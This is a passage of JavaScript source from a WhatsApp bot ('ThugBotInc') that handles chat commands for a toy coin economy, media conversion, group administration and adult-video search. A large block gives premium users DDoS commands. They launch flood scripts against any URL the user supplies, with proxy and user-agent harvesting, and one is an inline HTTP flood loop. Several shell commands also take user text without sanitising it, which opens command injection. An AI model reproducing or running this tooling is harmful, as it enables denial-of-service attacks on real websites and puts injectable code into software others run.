      case 'withdraw': case 'withdrawal': {
        if (!m.isGroup) return reply(mess.group)
 await ThugBotInc.sendMessage(m?.chat, { react: { text: `💲`, key: m?.key } });

        if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
        const user = m.sender
        if (!text) return reply("*Provide the amount you want to withdraw!*");
        const query = text.trim();
        const cara = 'cara'
        const withdraw = await eco.withdraw(user, cara, query);
        if (withdraw.noten) return reply('*🏧 Insufficient funds in your bank*'); //if user states more than whats in his wallet
        const add = eco.give(user, cara, query);
        reply(`*🏦 ALERT  ${withdraw.amount} 💰 has been added in your wallet.*`)

      }
        break;


      case 'rob': case 'attack': {
        if (!m.isGroup) return reply(mess.group)
         await ThugBotInc.sendMessage(m?.chat, { react: { text: `🥷`, key: m?.key } });
          if (!text) return reply(`*Use ${prefix}rob @group participant*`)
          const target =
            m.quoted && m.mentionedJid.length === 0
              ? m.quoted.sender
              : m.mentionedJid[0] || null;
          if (!target || target === m.sender) return reply("*what are you trying to do! 👮‍♂️*")
          if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
          while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
          const cara = "cara"
          const user1 = m.sender
          const user2 = target
          const k = 250
          const balance1 = await eco.balance(user1, cara)
          const balance2 = await eco.balance(user2, cara)
          const typ = ['ran', 'rob', 'caught'];
          const random = typ[Math.floor(Math.random() * typ.length)];
          if (k > balance1.wallet) return reply(`*You don't have enough money to pay the cops incase you get caught*`);
          if (k > balance2.wallet) return reply(`*Victim is too poor, let go. 😭*`);
          let tpy = random
          switch (random) {
            case 'ran':
              await reply(`*Your victim escaped, better luck next time.*`)
          }
        }
        break;


      case 'transfer': case 'give': {
        if (!m.isGroup) return reply(mess.group)
        let value = text.trim().split(" ");
        if (value[0] === "") return reply(`*Use ${prefix}transfer 100 @group participant*`);
        const target =
          m.quoted && m.mentionedJid.length === 0
            ? m.quoted.sender
            : m.mentionedJid[0] || null;
        if (!target || target === m.sender) return reply("*what are you trying to do! 👮‍♂️*")
        if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
        while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
        const cara = "cara"
        const user1 = m.sender
        const user2 = target
        const word = value[0];
        const code = value[1];
        let d = parseInt(word)
        if (!d) return reply(`*Incorrect input*\n*Use ${prefix}transfer 100 @group participant*`)

        const balance = await eco.balance(user1, cara);
        let a = (balance.wallet) < parseInt(word)
        //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.	
        if (a == true) return reply(`*You don't have sufficient money to transfer*`);

        const deduct = await eco.deduct(user1, cara, value[0]);
        const give = await eco.give(user2, cara, value[0]);
        reply(`*📠 Transaction successful*`)

      }
        break;

      case 'wealth': case 'ritual': {
      if (!ThugTheCreator) return reply(mess.owner)
        var user = m.sender
        var cara = 'cara'
        const give1 = eco.give(user, cara, 9999)
        reply(`*You are the wealthiest my Lord*`)
      }
        break;
case 'gamble': 
case 'lottery': {
    // React with a dice emoji
    await ThugBotInc.sendMessage(m.chat, { react: { text: `🎲`, key: m.key } });

    // Ensure the command is used in a group
    if (!m.isGroup) return reply(mess.group);

    // Parse and validate input
    const inputs = text.trim().split(" ");
    const value = inputs[0]?.toLowerCase(); // Amount to gamble
    const direction = inputs[1];           // Direction to bet on (left, right, up, down)
    const amount = parseInt(value);

    if (!amount || isNaN(amount)) {
        return reply(`*Incorrect input*\n*Example: ${prefix}gamble 100 left*`);
    }
    if (!direction || !['up', 'down', 'left', 'right'].includes(direction)) {
        return reply(`*Specify the direction (left, right, up, or down) you are betting on!*\n*Example: ${prefix}gamble 100 left*`);
    }

    // Get user data and balance
    const user = m.sender;
    const currency = 'cara';
    const balance = await eco.balance(user, currency);
    if (balance.wallet < amount) {
        return reply(`*You don't have sufficient coins 🪙 to gamble with.*`);
    }
    if (amount < 50) {
        return reply(`*Sorry ${pushname}, you can only gamble with at least 50 coins 🪙.*`);
    }

    // Gambling logic
    const multiplier = 2; // Winning multiplier
    const randomDirections = ["up", "down", "left", "right"];
    const randomChoice = randomDirections[Math.floor(Math.random() * randomDirections.length)];

    if (randomChoice === direction) {
        // User wins
        const winnings = amount * multiplier;
        await eco.give(user, currency, winnings);
        return reply(`*🎉 You won! 💎 ${winnings} coins have been added to your wallet.*`);
    } else {
        // User loses
        await eco.deduct(user, currency, amount);
        return reply(`*😔 You lost 💎 ${amount} coins. Better luck next time!*`);
    }
}
break;



      //-----------------Slot----------------------

      case 'slot': case 'spin': {
        if (!m.isGroup) return reply(mess.group)
        await ThugBotInc.sendMessage(m?.chat, { react: { text: `🎰`, key: m?.key } });
        var today = new Date();
        if (today.getDay() == 6 || today.getDay() == 5 || today.getDay() == 0) {
          if (text == 'help') return reply(`*1). Use ${prefix}slot to play*\n\n*2). You must have 100 🪙 in your wallet*\n\n*3). If you don't have money in wallet then withdraw from your bank*\n\n*4). If you don't have money in your bank too then use economy features to gain money*`)
          if (text == 'money') return reply(`*1). Small Win --> +20🪙\n\n*2). Small Lose --> -20 🪙\n\n*3). Big Win --> +100 🪙\n\n*4) Big Lose --> -50 🪙\n\n*5) 🎰 JackPot --> +1000*`)
          const fruit1 = ["🥥", "🍎", "🍇"]
          const fruit2 = ["🍎", "🍇", "🥥"]
          const fruit3 = ["🍇", "🥥", "🍎"]
          const fruit4 = ["🍇", "🥥", "🍎"]
          const lose = ['*You suck at playing this game*\n\n_--> 🍍-🥥-🍎_', '*Totally out of line*\n\n_--> 🥥-🍎-🍍_', '*Are you a newbie?*\n\n_--> 🍎-🍍-🥥_']
          const smallLose = ['*You cannot harvest coconut 🥥 in a pineapple 🍍 farm*\n\n_--> 🍍>🥥<🍍_', '*Apples and Coconut are not best Combo*\n\n_--> 🍎>🥥<🍎_', '*Coconuts and Apple are not great deal*\n\n_--> 🥥>🍎<🥥_']
          const won = ['*You harvested a basket of*\n\n_--> 🍎+🍎+🍎_', '*Impressive, You must be a specialist in plucking coconuts*\n\n_--> 🥥+🥥+🥥_', '*Amazing, you are going to be making pineapple juice for the family*\n\n_--> 🍍+🍍+🍍_']
          const near = ['*Wow, you were so close to winning pineapples*\n\n_--> 🍎-🍍+🍍_', '*Hmmm, you were so close to winning Apples*\n\n_--> 🍎+🍎-🍍_']
          const jack = ['*🥳 JackPot 🤑*\n\n_--> 🍇×🍇×🍇×🍇_', '*🎉 JaaackPooot!*\n\n_--> 🥥×🥥×🥥×🥥_', '*🎊 You Just hit a jackpot worth 1000 🪙*']
          const user = m.sender
          const cara = "cara"
          const k = 100
          const balance1 = await eco.balance(user, cara)

          if (k > balance1.wallet) return reply(`*You are going to be spinning on your wallet, you need at least 100 🪙*`);
          const f1 = fruit1[Math.floor(Math.random() * fruit1.length)];
          const f2 = fruit2[Math.floor(Math.random() * fruit2.length)];
          const f3 = fruit3[Math.floor(Math.random() * fruit3.length)];
          const f4 = fruit4[Math.floor(Math.random() * fruit4.length)];
          const mess1 = lose[Math.floor(Math.random() * lose.length)];
          const mess2 = won[Math.floor(Math.random() * won.length)];
          const mess3 = near[Math.floor(Math.random() * near.length)];
          const mess4 = jack[Math.floor(Math.random() * jack.length)];
          const mess5 = smallLose[Math.floor(Math.random() * smallLose.length)];

          if ((f1 !== f2) && f2 !== f3) {
            const deduct1 = await eco.deduct(user, cara, 50);
            reply(`${mess1}\n\n*Big Lose -->* _50 🪙_`)
          }
          else if ((f1 == f2) && f2 == f3) {
            const give1 = await eco.give(user, cara, 100);
            reply(`${mess2}\n*_Big Win -->* _100 🪙_`)
          }
          else if ((f1 == f2) && f2 !== f3) {
            const give2 = await eco.give(user, cara, 20);
            reply(`${mess3}\n*Small Win -->* _20 🪙_`)
          }
          else if ((f1 !== f2) && f1 == f3) {
            const deduct2 = await eco.deduct(user, cara, 20);
            reply(`${mess5}\n\n*Small Lose -->* _20 🪙_`)
          }
          else if ((f1 !== f2) && f2 == f3) {
            const give4 = eco.give(user, cara, 20);
            reply(`${mess3}\n\n*Small Win -->* _20 🪙_`)
          }
          else if (((f1 == f2) && f2 == f3) && f3 == f4) {
            const give5 = eco.give(user, cara, 1000);
            reply(`${mess4}\n\n*🎰 JackPot --> 1000 🪙*`)
          }
          else {
            reply(`*Do you understand what you are doing?*`)
          }
        }
        else {
          reply(`*You can only play this game during the weekends*\n\n*🗓️ Friday*\n*🗓️ Saturday*\n*🗓️ Sunday*`)
        }
      }
        break;
        

case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`*Reply to a sticker with caption ${prefix + command}*`)
                await loading()
                let media = await ThugBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ThugBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
case 'tomp4': case 'tovideo': {
if (!m.quoted) return reply('*Reply to an animated sticker*')
if (!/webp/.test(mime)) return reply(`*Reply sticker with caption ${prefix + command}*`)
await loading()
let { webp2mp4File } = require('./lib/uploader2')
let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await ThugBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: '*Waazzaaaa 😝*' } }, { quoted: m })
await fs.unlinkSync(media)
}
break



        




  
case 'getjoinrequest':{
	if (!m.isGroup) return reply(mess.group)
	if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
	const response = await ThugBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    ThugBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${xtime}\n`;
  });

  ThugBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'clearall': case 'clearchat': {
if (!ThugTheCreator) return reply(mess.owner)
ThugBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!ThugTheCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.privates)
ThugBotInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!ThugTheCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.privates)
ThugBotInc.chatModify({ pin: false }, m.chat)
}
break
case 'setdesc':
            case 'setdescription':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                if (!text) return reply('*Provide a text*')
                await ThugBotInc.groupUpdateDescription(m.chat, text)
                reply(mess.success)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
               if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                if (!quoted) return reply(`*Reply to an image with caption ${prefix + command}*`)
                if (!/image/.test(mime)) return reply(`*Reply to an image with caption ${prefix + command}*`)
                var medis = await ThugBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ThugBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.success)
                } else {
                    var memeg = await ThugBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.success)
                }
                break
                  case 'revoke':
            case 'resetgclink':
            case 'resetlinkgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                await ThugBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`*Link rest successfully*`)
                    })
            break

case 'ddos-brow': {
if (!isPremium) return replyprem(mess.premium)
if (!text) return reply(`*Example : ${prefix + command} [url]*`)
reply(`*A DDOS attack has been executed against the targeted Website:*\n\n*🎯 TARGET :* ${text}\n*🕐 TIME : 60*\n*🥀 THREAD : 20*\n* 👨‍💻 RATE : 100*\n> 🅿︎🄾𝚠𝕖𝚛𝕖𝐝 𝐁ʏ T𝗵Ⓤ𝖌🅝︎Ⓘ︎🄵🅸︎ᥴe͟n⃠𝚝 𝕋𝐞ᶜʜ™`);
exec(`node ./database/ddos/ddos-brow.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
case 'ddos-mix': {
if (!isPremium) return replyprem(mess.premium)
if (!text) return reply(`*Example : ${prefix + command} [url]*`)
reply(`*A DDOS attack has been executed against the targeted Website:*\n\n*🎯 TARGET :* ${text}\n*🕐 TIME : 60*\n*🥀 THREAD : 20*\n* 👨‍💻 RATE : 100*\n> 🅿︎🄾𝚠𝕖𝚛𝕖𝐝 𝐁ʏ T𝗵Ⓤ𝖌🅝︎Ⓘ︎🄵🅸︎ᥴe͟n⃠𝚝 𝕋𝐞ᶜʜ™`);
exec(`node ./database/ddos/ddos-mix.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break       
case'ddos-lol':{
if (!isPremium) return replyprem(mess.premium)
if (!text) return reply(`Example : ${prefix + command} [url]`)
let ddosin = require("./database/ddos/ddos-lol.js")
ddosin(`${text}`)
if (args.length === 1 && text) {
reply(`*A DDOS attack has been executed against the targeted Website:*\n\n*🎯 TARGET :* ${text}\n*🕐 TIME : 60*\n*🥀 THREAD : 20*\n* 👨‍💻 RATE : 100*\n> 🅿︎🄾𝚠𝕖𝚛𝕖𝐝 𝐁ʏ T𝗵Ⓤ𝖌🅝︎Ⓘ︎🄵🅸︎ᥴe͟n⃠𝚝 𝕋𝐞ᶜʜ™`)
exec(`node ./database/ddos/ddos-lol.js`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}}
break
case 'ddos-tls': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-tls-v2': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-kilua': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-tls-bypass': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-bypass-cf': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-tls-vip': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-floods': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-egao': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-xchrome': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`*Please wait a moment, it's in process 🕧. A DDoS attack has been executed against the destination Website: ${url}\nThis process is expected to take ${time} seconds. Thank you for your patience.*`);
exec(`node ./database/ddos/ddos-chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`*Example : ${prefix + command}  [url] [time] [thread] [rate]*`)
}
}
break
case 'ddos-fetch': {
if (!isPremium) return replyprem(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 1000

if (args.length === 2 && url && !isNaN(time)) {
let attack = () => {
let totalRequests = 0
let threads = []

for (let j = 0; j < 6; j++) {
threads.push(
new Promise((resolve, reject) => {
let interval = setInterval(() => {
for (let j = 0; j < 100; j++) {
fetch(url)
.then(() => {
totalRequests++
console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
})
.catch(err => {})
}
}, 750)
setTimeout(() => {
clearInterval(interval)
resolve()
}, time)
})
)
}

Promise.all(threads)
.then(() => console.log("Attack complete"))
.catch(err => console.error("Error in attack:", err))
}

attack()
} else {
reply(`*Example : ${prefix + command}  [url] [time]*`)
}
}
break
case 'proxy': {
if (!text) { return reply('*What Do You Want.*') }
const command = text
 if (command === 'update') {
 reply('Updating...')
 exec(`node ./database/ddos/scrape.js`, (error, stdout, stderr) => {
 if (error) {
 console.error('Error updating proxies:', error);
 reply('Error updating proxies.');
 } else {
 console.log('Proxies updated successfully.');
 reply('Proxies updated successfully.');
 }
 });
 } else if (command === 'total') {
 fs.readFile('./proxy.txt', 'utf8', (err, data) => {
 if (err) {
 console.error('Error reading proxy file:', err);
 reply('Error reading proxy file.');
 return;
 }
 
 const proxies = data.trim().split('\n');
 const totalProxies = proxies.length;
ThugBotInc.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Proxies Total`,
body: `List Proxies ${totalProxies}`,
mediaType: 1, 
renderLargerThumbnail : true,
thumbnailUrl: ``,
sourceUrl: ``
}}, text: `Proxies Total: ${totalProxies}`}, {quoted: m})
 });
 } else if (command === 'download') {
 const proxyPath = './proxy.txt'
 ThugBotInc.sendFile(m.chat, proxyPath, 'proxy.txt', 'Downloaded Proxy...');
 } else {
 reply('*Invalid .proxy command.*\n*Usage: .proxy update, total or download*');
 }
}
break
case 'ua': {
    if (!text) { 
        return reply('*What do you want.*'); 
    }
    
    const command = args[0];
    const need = args[1];

    if (command === 'create') {
        if (!need) {
            return reply('*Please provide the required input to create.*');
        }
        
        exec(`node ./database/ddos/uagen.js ${need} ua.txt`, (error, stdout, stderr) => {
            if (error) {
                console.error('Error Creating User Agent:', error);
                reply('*Error Creating User Agent.*');
            } else {
                console.log('User Agent created successfully.');
                reply('*User Agent created successfully.*');
            }
        });
    } else if (command === 'total') {
        fs.readFile('./ua.txt', 'utf8', (err, data) => {
            if (err) {
                console.error('Error reading ua file:', err);
                reply('*Error reading ua file.*');
                return;
            }

            const proxies = data.trim().split('\n');
            const totalProxies = proxies.length;
            ThugBotInc.sendMessage(m.chat, { 
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true, 
                        title: `User Agent Total`,
                        body: `List ${totalProxies}`,
                        mediaType: 1,  
                        renderLargerThumbnail: true,
                        thumbnailUrl: `https://telegra.ph/file/1d96543937ea1ca04aebc.png`,
                        sourceUrl: ``
                    }
                }, 
                text: `User Agent Total: ${totalProxies}` 
            }, { quoted: m });
        });
    } else if (command === 'download') {
        const proxyPath = './ua.txt';
        ThugBotInc.sendFile(m.chat, proxyPath, 'ua.txt', 'Downloaded User Agent...');
    } else {
        reply('*Invalid .ua command. Usage: .ua create <input>, total, or download*');
    }
};
break
case 'capcut':{
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await ThugBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result.video_ori}}, { upload: ThugBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363287688699869@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ThugBotInc.relayMessage(m.chat, msgs.message, {})
await ThugBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ThugBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case'ttslide': case 'tiktokslide':{
if (!text) return reply(`*Usage ${prefix+command} <tiktok image slide link>*\n*Example*\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
ThugBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
await ThugBotInc.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await ThugBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ThugBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': case 'xxx': {
    try {
        if (!text) return reply(`*Example: ${prefix + command} blowjob*`);

        await ThugBotInc.sendMessage(m.chat, { react: { text: `💦`, key: m.key } });

        // Fetch video details
        const Xurl = `https://apis.davidcyriltech.my.id/search/xvideo?text=${encodeURIComponent(text)}`;
        const XurlResponse = await axios.get(Xurl);

        if (XurlResponse && XurlResponse.data && Array.isArray(XurlResponse.data.result) && XurlResponse.data.result.length > 0) {
            const { title, duration, thumbnail, url } = XurlResponse.data.result[0]; // Ensure we're using the first result

            if (!title || !duration || !thumbnail || !url) {
                return reply(`*Incomplete data received. Please try again.*`);
            }

            const xbody = `*🍆💦 𝚇𝚇𝚇 𝚅𝙸𝙳𝙴𝙾 𝚁𝙴𝚂𝚄𝙻𝚃 🍑🔞*\n` +
                          `*📜 𝚃𝙸𝚃𝙻𝙴:* ${title}\n` +
                          `*⏳ 𝙳𝚄𝚁𝙰𝚃𝙸𝙾𝙽:* ${duration}\n` +
                          `*🔗 𝙻𝙸𝙽𝙺:* ${url}`;

            // Send message with thumbnail and link
            await ThugBotInc.sendMessage(m.chat, {
                image: { url: thumbnail },
                caption: xbody
            }, { quoted: m });

        } else {
            reply(`*No results found for: ${text}*`);
        }
    } catch (error) {
        console.error('Error during xvideo command:', error.message || error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}


 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await loading()
                let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                ThugBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`*Reply to the audio with caption ${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
                case 'translate':{
  	if (!q) return reply(`*Where is the text you want to translate*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

